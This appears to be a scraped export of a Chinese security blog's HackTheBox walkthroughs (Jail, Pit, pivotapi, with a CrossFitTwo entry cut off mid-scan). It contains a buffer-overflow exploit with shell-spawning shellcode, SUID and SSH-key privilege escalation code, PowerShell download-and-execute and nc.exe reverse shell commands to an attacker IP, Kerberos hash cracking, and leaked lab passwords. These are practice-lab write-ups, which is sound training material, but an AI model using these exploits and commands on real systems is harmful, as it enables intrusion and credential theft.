HackTheBox","slug":"Jail-HackTheBox","date":"2021-05-20T07:05:04.000Z","updated":"2021-05-20T07:07:45.506Z","comments":true,"path":"2021/05/20/Jail-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/20/Jail-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/45 10.10.10.34 端口扫描需要全端口： 1234567891011121314➜ Jail nmap -p- 10.10.10.34Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 14:24 CSTNmap scan report for 10.10.10.34Host is up (0.51s latency).Not shown: 65529 filtered portsPORT STATE SERVICE22/tcp open ssh80/tcp open http111/tcp open rpcbind2049/tcp open nfs7411/tcp open daqstream20048/tcp open mountdNmap done: 1 IP address (1 host up) scanned in 1624.97 seconds 80 nfsnfs可以发现两个目录无限制： 1234$ showmount -e 10.10.10.34Exports list on 10.10.10.34:/opt */var/nfsshare * 目录扫描目录扫描可以扫到jailuser，需要中等字典： 123gobuster dir -u http://10.10.10.34/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50/jailuser (Status: 301) [Size: 236] [--&gt; http://10.10.10.34/jailuser/] 里面是jail程序文件和源码： jail这个就是7411端口的服务，根据源码和程序调试可以发现bof，源码里debug模式可以得到userpass buffer，就是基础的bof： 12345678# Leaked buffer address on remoteuserpass buffer addr 0xffffd610offset 28# 0xffffd610 + offset + 4 bytes of junk#buffer_offset &#x3D; 0xffffd610 + 32#buffer_offset &#x3D; hex(buffer_offset)#pint(buffer_offset)#Calculated buffer &#x3D; 0xffffd630 bof exploit就是直接执行shellcode： https://www.exploit-db.com/exploits/34060 打到nobody shell： exp.py1234567891011121314from pwn import *shellcode = \"\\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"# payload = \"A\"*28 + p32(0xffffd630) + shellcodepayload = \"A\"*28 + \"\\x30\\xd6\\xff\\xff\" + shellcoder = remote('10.10.10.34', 7411)print(r.recv(1024))r.sendline('USER admin')print(r.recv(1024))r.sendline('PASS ' + payload)r.interactive() frank 信息当前nobody可以以frank身份运行/opt/logreader/logreader.sh，前面nfs看到有opt，所以下一步就是通过nfs打到frank： NFSmount后的目录需要uid1000的用户才能访问，因为frank的uid是1000: nfsshare实际用到的是nfsshare，用到的是nfs的配置错误导致suid继承，这样我们可以得到远程服务器上uid 1000的用户shell： https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe 1234sudo mount -t nfs 10.10.10.34:/var/nfsshare miao1 -o nolockgcc shell.c -o shell -m32cp ../shell .chmod 4777 shell shell.c123456789101112131415/*gcc shell.c -o shell -m32*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;int main()&#123;setuid(1000);FILE *fptr;fptr = fopen(\"/home/frank/.ssh/authorized_keys\", \"a\");fprintf(fptr, \"ssh-rsa XXXXXX\");fclose(fptr);return 0;&#125; user flagsuid程序执行后，写入公钥到frank用户，ssh登录，得到user.txt: adm 信息rvim： https://gtfobins.github.io/gtfobins/rvim/#sudo frank to adm123sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c# 进入命令模式py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\") 提权信息发现一个加密的keys.rar和密码提示信息： 另外更深层目录发现另一个提示信息： 根据解出来的这句话搜到这篇文章： https://www.bbc.com/news/world-us-canada-42826582 得到相关信息： 123Frank Morris1962最后一位是符号 密码字典根据这些信息可以生成密码字典： 1crunch 11 11 -t Morris1962^ &gt; password.txt 破解出rar密码，解压出一个公钥： 12345/usr/sbin/rar2john keys.rar &gt; keyssudo john --wordlist=./password.txt keysMorris1962!unrar e keys.rar# 得到rootauthorizedsshkey.pub 私钥根据公钥得到私钥： https://github.com/Ganapati/RsaCtfTool 1python3 ~/Tools/RsaCtfTool/RsaCtfTool.py --publickey ./rootauthorizedsshkey.pub --private root flagssh使用私钥登录，得到root.txt: 参考资料 https://www.exploit-db.com/exploits/34060 https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe https://gtfobins.github.io/gtfobins/rvim/#sudo https://www.quipqiup.com/ https://www.bbc.com/news/world-us-canada-42826582 https://en.wikipedia.org/wiki/June_1962_Alcatraz_escape_attempt#Frank_Morris https://github.com/Ganapati/RsaCtfTool https://thecybergeek.co.uk/walkthrough/hackthebox/2021/02/06/HackTheBox-Jail.html https://www.hackthebox.eu/home/machines/writeup/45 HackTheBox - Jail - YouTubehttps://www.youtube.com/watch?v=80-73OYcrrk&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Pit - HackTheBox","slug":"Pit-HackTheBox","date":"2021-05-19T02:27:27.000Z","updated":"2021-09-26T05:20:49.946Z","comments":true,"path":"2021/05/19/Pit-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/19/Pit-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/346 10.10.10.241 端口扫描这个除了TCP还需要UDP,snmp用的udp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116➜ ~ nmap -sC -sV -Pn 10.10.10.241Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 23:50 CSTWarning: 10.10.10.241 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.10.241Host is up (0.75s latency).Not shown: 966 closed ports, 31 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey:| 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)| 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)|_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)80/tcp open http nginx 1.14.1|_http-server-header: nginx/1.14.1|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux9090/tcp open ssl/zeus-admin?| fingerprint-strings:| GetRequest, HTTPOptions:| HTTP/1.1 400 Bad request| Content-Type: text/html; charset=utf8| Transfer-Encoding: chunked| X-DNS-Prefetch-Control: off| Referrer-Policy: no-referrer| X-Content-Type-Options: nosniff| Cross-Origin-Resource-Policy: same-origin| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head&gt;| &lt;title&gt;| request| &lt;/title&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;| &lt;style&gt;| body &#123;| margin: 0;| font-family: \"RedHatDisplay\", \"Open Sans\", Helvetica, Arial, sans-serif;| font-size: 12px;| line-height: 1.66666667;| color: #333333;| background-color: #f5f5f5;| border: 0;| vertical-align: middle;| font-weight: 300;|_ margin: 0 0 10p| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1| Not valid before: 2020-04-16T23:29:12|_Not valid after: 2030-06-04T16:09:12|_ssl-date: TLS randomness does not represent time1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=5/14%Time=609D5145%P=x86_64-pc-linux-gnSF:u%r(GetRequest,E70,\"HTTP/1\\.1\\x20400\\x20Bad\\x20request\\r\\nContent-Type:SF:\\x20text/html;\\x20charset=utf8\\r\\nTransfer-Encoding:\\x20chunked\\r\\nX-DNSF:S-Prefetch-Control:\\x20off\\r\\nReferrer-Policy:\\x20no-referrer\\r\\nX-ContSF:ent-Type-Options:\\x20nosniff\\r\\nCross-Origin-Resource-Policy:\\x20same-oSF:rigin\\r\\n\\r\\n29\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20SF:&lt;title&gt;\\r\\nb\\r\\nBad\\x20request\\r\\nd08\\r\\n&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;metSF:a\\x20http-equiv=\\\"Content-Type\\\"\\x20content=\\\"text/html;\\x20charset=utfSF:-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=deSF:vice-width,\\x20initial-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;style&gt;\\n\\tbody\\xSF:20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20margin:\\x200;\\n\\x2SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-family:\\x20\\\"RedHatDiSF:splay\\\",\\x20\\\"Open\\x20Sans\\\",\\x20Helvetica,\\x20Arial,\\x20sans-serif;\\n\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-size:\\x2012px;\\n\\x2SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20line-height:\\x201\\.6666666SF:7;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20color:\\x20#333333;\\SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20background-color:\\x20#SF:f5f5f5;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&#125;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20img\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20border:\\SF:x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20vertical-align:\\SF:x20middle;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&#125;\\n\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20h1\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-wSF:eight:\\x20300;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&#125;\\n\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20p\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20marSF:gin:\\x200\\x200\\x2010p\")%r(HTTPOptions,E70,\"HTTP/1\\.1\\x20400\\x20Bad\\x20rSF:equest\\r\\nContent-Type:\\x20text/html;\\x20charset=utf8\\r\\nTransfer-EncodSF:ing:\\x20chunked\\r\\nX-DNS-Prefetch-Control:\\x20off\\r\\nReferrer-Policy:\\xSF:20no-referrer\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nCross-Origin-ResSF:ource-Policy:\\x20same-origin\\r\\n\\r\\n29\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;SF:head&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;\\r\\nb\\r\\nBad\\x20request\\r\\nd08\\r\\n&lt;/titleSF:&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\\"Content-Type\\\"\\x20content=\\\"teSF:xt/html;\\x20charset=utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\SF:\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\xSF:20\\x20&lt;style&gt;\\n\\tbody\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20margin:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20fonSF:t-family:\\x20\\\"RedHatDisplay\\\",\\x20\\\"Open\\x20Sans\\\",\\x20Helvetica,\\x20ASF:rial,\\x20sans-serif;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20fSF:ont-size:\\x2012px;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20linSF:e-height:\\x201\\.66666667;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20color:\\x20#333333;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0background-color:\\x20#f5f5f5;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&#125;\\n\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20img\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20border:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20vertical-align:\\x20middle;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&#125;\\n\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20h1\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20font-weight:\\x20300;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:&#125;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20p\\x20&#123;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20margin:\\x200\\x200\\x2010p\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1810.38 seconds➜ ~ sudo nmap -sU -sV 10.10.10.241Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 23:49 CSTWarning: 10.10.10.241 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.10.241Host is up (0.071s latency).Not shown: 745 filtered ports, 254 open|filtered portsPORT STATE SERVICE VERSION161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)Service Info: Host: pit.htbService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 2622.99 seconds 9090Centos login,得到域名，加hosts： 110.10.10.241 dms-pit.htb pit.htb SNMPsnmpwalk可以获取信息，但可读性不好，可以使用这个脚本： https://github.com/dheiland-r7/snmp 部分有用信息： 123456789101112131415161718192021222324252627282930.1.3.6.1.2.1.1.1.0 &#x3D; STRING: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64.1.3.6.1.2.1.1.2.0 &#x3D; OID: .1.3.6.1.4.1.8072.3.2.10.1.3.6.1.2.1.1.3.0 &#x3D; Timeticks: (2349265) 6:31:32.65.1.3.6.1.2.1.1.4.0 &#x3D; STRING: Root &lt;root@localhost&gt; (configure &#x2F;etc&#x2F;snmp&#x2F;snmp.local.conf).1.3.6.1.2.1.1.5.0 &#x3D; STRING: pit.htb.1.3.6.1.2.1.1.6.0 &#x3D; STRING: Unknown (edit &#x2F;etc&#x2F;snmp&#x2F;snmpd.conf).1.3.6.1.4.1.2021.9.1.2.2 &#x3D; STRING: &#x2F;var&#x2F;www&#x2F;html&#x2F;seeddms51x&#x2F;seeddms.1.3.6.1.4.1.2021.9.1.3.1 &#x3D; STRING: &#x2F;dev&#x2F;mapper&#x2F;cl-root.1.3.6.1.4.1.2021.9.1.3.2 &#x3D; STRING: &#x2F;dev&#x2F;mapper&#x2F;cl-seeddms.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 &#x3D; STRING: &#x2F;usr&#x2F;bin&#x2F;monitorDatabase statusOK - Connection to database successful.System release infoCentOS Linux release 8.3.2011SELinux SettingsuserLogin Name SELinux User MLS&#x2F;MCS Range Service__default__ unconfined_u s0-s0:c0.c1023 *michelle user_u s0 *root unconfined_u s0-s0:c0.c1023 *System uptime 21:12:11 up 6:32, 0 users, load average: 0.02, 0.10, 0.14 Cockpit9090的登录，查看源码可以知道是cockpi,搜索已知漏洞： 但尝试无效 dms-pit直接访问是403: 根据前面SNMP得到的信息，可以访问seeddms51x/seeddms： seeddms不存在常规弱口令，但SNMP中得到的用户名可以登录，密码和用户名相同： 1michelle ： michelle 根据upgrade note，可以知道版本： rce没有5.1.15的，但5.1.11的RCE可以用： SeedDMS versions &lt; 5.1.11 - Remote Command Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/47022 就是直接上传php文件，下载那里得到id,文件会被重命名为1.php: 但reverse shell秒断： 配置文件所以现在通过webshell读配置文件,得到一个密码： 123cat ..&#x2F;..&#x2F;..&#x2F;conf&#x2F;settings.xml&lt;database dbDriver&#x3D;&quot;mysql&quot; dbHostname&#x3D;&quot;localhost&quot; dbDatabase&#x3D;&quot;seeddms&quot; dbUser&#x3D;&quot;seeddms&quot; dbPass&#x3D;&quot;ied^ieY6xoquu&quot; doNotCheckVersion&#x3D;&quot;false&quot;&gt; Cockpit得到的密码可以登录cockpit，ssh只接受密钥登录： 1michelle : ied^ieY6xoquu user flagmichelle用户目录得到user.txt: 提权信息前面snmp可以看到/usr/bin/monitor ，这个是root在运行的，会运行特定目录下所有脚本，我们不能访问目录，但对目录有写和执行权限： 那么我们就可以在其中写一个sh文件，使其执行我们的命令，例如写公钥到root： 1echo &quot;ssh-rsa xxx&quot; &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 提权 &amp; root flag复制脚本进去，snmp触发执行，ssh登录： 12snmpwalk -v 1 -c public 10.10.10.241 1.3.6.1.4.1.8072.1.3.2.2.1.2sudo snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects 参考资料 https://github.com/dheiland-r7/snmp SeedDMS versions &lt; 5.1.11 - Remote Command Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/47022 HTB - PIT Writeup (User and root) - No Credits | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-PIT-Writeup-User-and-root-No-Credits HTB pit [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-pit-Discussion Pit: Hack The Box Walkthroughhttps://hackso.me/pit-htb-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"pivotapi - HackTheBox","slug":"pivotapi-HackTheBox","date":"2021-05-13T06:38:24.000Z","updated":"2021-11-08T02:51:44.344Z","comments":true,"path":"2021/05/13/pivotapi-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/13/pivotapi-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/345 10.10.10.240 端口扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970$ nmap -sC -sV -Pn 10.10.10.240Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 10:17 CSTNmap scan report for 10.10.10.240Host is up (0.069s latency).Not shown: 986 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-19-21 03:06PM 103106 10.1.1.414.6453.pdf| 02-19-21 03:06PM 656029 28475-linux-stack-based-buffer-overflows.pdf| 02-19-21 12:55PM 1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf| 02-19-21 03:06PM 1018160 ExploitingSoftware-Ch07.pdf| 08-08-20 01:18PM 219091 notes1.pdf| 08-08-20 01:34PM 279445 notes2.pdf| 08-08-20 01:41PM 105 README.txt|_02-19-21 03:06PM 1301120 RHUL-MA-2009-06.pdf| ftp-syst:|_ SYST: Windows_NT22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey:| 3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)| 256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)|_ 256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-05-13 02:18:50Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ms-sql-ntlm-info:| Target_Name: LICORDEBELLOTA| NetBIOS_Domain_Name: LICORDEBELLOTA| NetBIOS_Computer_Name: PIVOTAPI| DNS_Domain_Name: LicorDeBellota.htb| DNS_Computer_Name: PivotAPI.LicorDeBellota.htb| DNS_Tree_Name: LicorDeBellota.htb|_ Product_Version: 10.0.17763| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2021-05-13T02:14:57|_Not valid after: 2051-05-13T02:14:57|_ssl-date: 2021-05-13T02:19:40+00:00; 0s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| ms-sql-info:| 10.10.10.240:1433:| Version:| name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2021-05-13T02:19:03|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 105.85 seconds 21 ftpftp匿名登录： usernameftp里pdf文件，查看信息得到一些用户名： 1234saifbyron gronsethalexKaorz ASREPROAST根据扫描结果发现是域环境，尝试根据用户名进行ASREPROAST，得到Kaorz用户的krb5asrep hash： 123python3 ~/Tools/impacket/examples/GetNPUsers.py LicorDeBellota.htb/ -usersfile users.txt -format john -dc-ip 10.10.10.240$krb5asrep$Kaorz@LICORDEBELLOTA.HTB:a9391a27ab311b826fdf715429495980$8e1ae7257257c8a5c0c67fa8ed6a639f260732e4a818298ba6d125a7a88f1ffe6f8f5db78e492f29530e97cfe2598fe1bf5cf23a0864ed38b1c8cc242df4fbd62e61baa2bd1bda681741c2341405693150036560e316cab6de8e1a96fb4c3374e33e2734db8aec7ea25938fa16e3ff42f9c71bfe67d543a40f6d8145384e259b83f8c4e41aeaeb5b72035140ac9f60411cff2c3bf85603729109cd67f7ca8769f1471f30936b2eb8270785cd1ccc3eeaa6806308a22e79aff5f638ba9dbe614a954ebe82a78f907721a5ab22a30605e6cc50192b02d5fd3de076a657a8bff3f6c636e37b4bc69ca40e8e98c3d0544b42321f1cde5993e68d hash crack破解出来Kaorz用户密码,Roper4155： 12345678910➜ Desktop sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt[sudo] password for miao:Using default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusRoper4155 ($krb5asrep$Kaorz@LICORDEBELLOTA.HTB)1g 0:00:00:16 DONE (2021-05-12 19:22) 0.06157g/s 657024p/s 657024c/s 657024C/s Roryarthur..Ronald8Use the \"--show\" option to display all of the cracked passwords reliablySession completed SMB得到的密码不能直接ssh，可以SMB： NETLOGONNETLOGON里Helpdesk里几个文件，下载下来分析： exe分析procmon之类的可以发现Restart-OracleService.exe调用cmd，CMDWatcher查看命令： 大概就是生成一个restart-service.exe，执行后删除： restart-service.exe所以直接修改bat内容，留下exe文件进行分析： 因为是重启服务用的，其中会有认证信息，API调用里得到oracle用户名密码格式： 12svc_oracle#oracle_s3rV1c3!2010 mssql另外还有两个msg文件，里面说oracle是2010年的，2020年换成了mssql，前面也看到有mssql服务，所以账号密码也都参照格式得到mssql的： 12sa#mssql_s3rV1c3!2020 mssqlMDUT牛逼： https://github.com/SafeGroceryStore/MDUT mssql shell MSSQL shell with file upload capability - The Portal of Knowledgehttps://alamot.github.io/mssql_shell/ priv有SeImpersonatePrivilege权限： reverse shell都弹不回来： 1234powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.14:7777/Invoke-PowerShellTcp.ps1\\\");\"cmd /c powershell iwr http://10.10.14.14:7777/nc.exe -outf \\windows\\system32\\spool\\drivers\\color\\cute.execmd /c start \\windows\\system32\\spool\\drivers\\color\\nc.exe 10.10.14.14 4444 -e cmd.exe 提权 &amp; flags因为有SeImpersonatePrivilege，可以PrintSpoofer提权： 路径不是常规的，根据Users目录和net user信息确认下就可以： 12C:/Windows/System32/spool/drivers/color/PrintSpoofer.exe -i -c \"powershell -c type C:\\Users\\3v4Si0N\\Desktop\\user.txt\"C:/Windows/System32/spool/drivers/color/PrintSpoofer.exe -i -c \"powershell -c type C:\\Users\\cybervaca\\Desktop\\root.txt\" 参考资料 https://github.com/SafeGroceryStore/MDUT MSSQL shell with file upload capability - The Portal of Knowledgehttps://alamot.github.io/mssql_shell/ HTB pivotapi [DISCUSSION] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-pivotapi-DISCUSSION PIVOTAPI FOOTHOLD WRITEUP | RaidForumshttps://raidforums.com/Thread-Tutorial-PIVOTAPI-FOOTHOLD-WRITEUP","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"CrossFitTwo - HackTheBox","slug":"CrossFitTwo-HackTheBox","date":"2021-05-12T06:37:41.000Z","updated":"2021-08-16T05:27:20.685Z","comments":true,"path":"2021/05/12/CrossFitTwo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/322 10.10.10.232 端口扫描 需要全端口，22,80,8953: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100$ nmap -p- 10.10.10.232Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 14:39 CSTNmap scan report for 10.10.10.232Host is up (0.067s latency).Not shown: 65532 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http8953/tcp open ub-dns-controlNmap done: 1 IP address (1 host up) scanned in 914.51 seconds$ nmap -sC -sV -Pn -p22,80,8953 10.10.10.232Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 15:08 CSTWARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second valueWARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second valueNmap scan report for employees.crossfit.htb (10.10.10.232)Host is up (0.067s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4 (protocol 2.0)| ssh-hostkey:| 3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)| 256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)|_ 256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)80/tcp open http (PHP 7.4.12)| fingerprint-strings:| GetRequest, HTTPOptions:| HTTP/1.0 200 OK| Connection: close| Connection: close| Content-type: text/html; charset=UTF-8| Date: Tue, 11 May 2021 07:08:01 GMT| Server: OpenBSD httpd| X-Powered-By: PHP/7.4.12| &lt;!DOCTYPE html&gt;| &lt;html lang=\"zxx\"&gt;| &lt;head&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;meta name=\"description\" content=\"Yoga StudioCrossFit\"&gt;| &lt;meta name=\"keywords\" content=\"Yoga, unica, creative, html\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;| &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt;| &lt;title&gt;CrossFit&lt;/title&gt;| &lt;!-- Google Font --&gt;| &lt;link href=\"https://fonts.googleapis.com/css?family=PT+Sans:400,700&amp;display=swap\" rel=\"stylesheet\"&gt;| &lt;link href=\"https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&amp;display=swap\" rel=\"stylesheet\"&gt;| &lt;!-- Css Styles --&gt;| &lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" type=\"text/css\"&gt;|_ &lt;link rel=\"styleshe|_http-server-header: OpenBSD httpd|_http-title: Login8953/tcp open ssl/ub-dns-control?| ssl-cert: Subject: 